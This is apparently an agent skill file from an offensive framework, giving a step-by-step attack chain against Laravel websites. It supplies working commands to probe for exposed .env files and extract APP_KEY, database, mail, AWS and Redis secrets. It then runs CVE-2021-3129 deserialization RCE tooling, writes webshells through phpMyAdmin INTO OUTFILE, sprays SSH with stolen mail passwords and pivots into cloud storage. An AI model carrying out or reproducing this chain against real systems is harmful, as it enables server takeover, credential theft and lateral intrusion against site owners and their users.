---
name: laravel-env-chain
description: Laravel .env exposure → APP_KEY extraction → deserialization RCE chain (70% success rate). The single highest-ROI attack chain in the framework. Load when .env is found on a Laravel target.
---

# Laravel .env Chain — 70% Success Rate

## When to Load
- `.env` file accessible (HTTP 200 with APP_KEY= in response)
- Laravel detected (X-Powered-By, debug mode, /vendor/ paths)
- Any Laravel version — the chain works broadly

## Phase 1: .env Discovery

```bash
# Direct .env check
curl -sk "https://TARGET/.env" | grep APP_KEY

# Common backup paths
for path in .env .env.backup .env.bak .env.old .env.local .env.production .env.example .env.save; do
  code=$(curl -sk -o /tmp/env_check -w '%{http_code}' "https://TARGET/$path")
  if [ "$code" = "200" ]; then
    echo "FOUND: $path"
    grep APP_KEY /tmp/env_check && echo "  APP_KEY present!"
  fi
done

# Laravel debug mode gives /_ignition/health-check
curl -sk "https://TARGET/_ignition/health-check" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('framework_version',''))"

# /vendor/ paths
curl -sk "https://TARGET/vendor/composer/installed.json" | python3 -c "
import sys,json
pkgs = json.load(sys.stdin).get('packages', json.load(sys.stdin))
for p in pkgs:
    if p['name'] == 'laravel/framework':
        print(f\"Laravel {p['version']}\")
"
```

## Phase 2: Extract APP_KEY

```bash
# If .env is accessible
curl -sk "https://TARGET/.env" > /tmp/laravel_env
APP_KEY=$(grep APP_KEY /tmp/laravel_env | cut -d= -f2)
echo "APP_KEY: $APP_KEY"

# Also extract for credential reuse
DB_HOST=$(grep DB_HOST /tmp/laravel_env | cut -d= -f2)
DB_USER=$(grep DB_USERNAME /tmp/laravel_env | cut -d= -f2)
DB_PASS=$(grep DB_PASSWORD /tmp/laravel_env | cut -d= -f2)
echo "DB: $DB_USER@$DB_HOST (pass: $DB_PASS)"

# Check for other secrets
grep -E "MAIL|AWS|REDIS|STRIPE|API_KEY|TOKEN" /tmp/laravel_env
```

## Phase 3: Deserialization RCE (The Chain)

```bash
# env_chain.py — full automated chain (preferred)
python3 ~/Hephaestus/tools/exploit/env_chain.py --target TARGET

# CVE-2021-3129 — Laravel Ignition RCE (CVSS 9.8)
python3 bin/cve_2021_3129_laravel*.py --target TARGET --gs

# Manual: If APP_KEY obtained and Ignition debug mode active
# 1. Generate encrypted cookie with unserialize payload
# 2. Send X-XSRF-TOKEN header with crafted payload
# 3. Shell writes to /public/ or /storage/
```

## Phase 4: Fallback Chains (if deser fails)

**Chain A: Database → PMA → webshell**
```bash
# If DB creds from .env, try PMA/Adminer
curl -sk -o /dev/null -w '%{http_code}' "https://TARGET/phpmyadmin/"
python3 ~/Hephaestus/tools/exploit/adminer_outfile_gs.py \
  --target TARGET --db-host $DB_HOST --db-user $DB_USER --db-pass $DB_PASS
```

**Chain B: SMTP creds → credential reuse**
```bash
# MAIL_USERNAME + MAIL_PASSWORD from .env → try SSH/other services
sshpass -p "$MAIL_PASSWORD" ssh $MAIL_USERNAME@TARGET_IP "id"
```

**Chain C: AWS/REDIS keys → cloud pivot**
```bash
# AWS_ACCESS_KEY_ID + AWS_SECRET_ACCESS_KEY → enumerate S3 buckets
AWS_ACCESS_KEY_ID=XXX AWS_SECRET_ACCESS_KEY=YYY aws s3 ls
```

## Phase 5: Capability Chain Thinking

```
.env exposed
  → APP_KEY → deserialization RCE (primary, 70%)
  → DB_USER + DB_PASS → PMA → INTO OUTFILE → webshell
  → MAIL_USERNAME + MAIL_PASS → SSH spray
  → AWS/REDIS keys → cloud pivot
  → APP_URL → verify target scope
  → APP_ENV=local → likely less hardened
```

## Dead Vector Diagnosis

| Symptom | Cause | Fix |
|---------|-------|-----|
| .env 403 | Properly configured nginx | Try .env.backup, .env.local, /storage/.env |
| APP_KEY but no Ignition | Laravel >8.0 with debug off | Try CVE-2021-3129 anyway (some patched versions still vulnerable) |
| deser fails | APP_KEY rotation | DB chain bypasses APP_KEY entirely |
| PMA 404 | Custom admin path | Fuzz: /db/, /admin/db/, /mysql/ |
| All dead | Server-centric | Check co-hosts on same IP |

## Quick Commands

```bash
# Automated .env chain (most reliable)
python3 ~/Hephaestus/tools/exploit/env_chain.py --target TARGET

# Ignition RCE
python3 bin/cve_2021_3129_laravel*.py --target TARGET --gs

# Laravel storm binary
bin/laravelstorm -u TARGET

# PMA chain from .env DB creds
python3 ~/Hephaestus/tools/exploit/adminer_outfile_gs.py --target TARGET
```
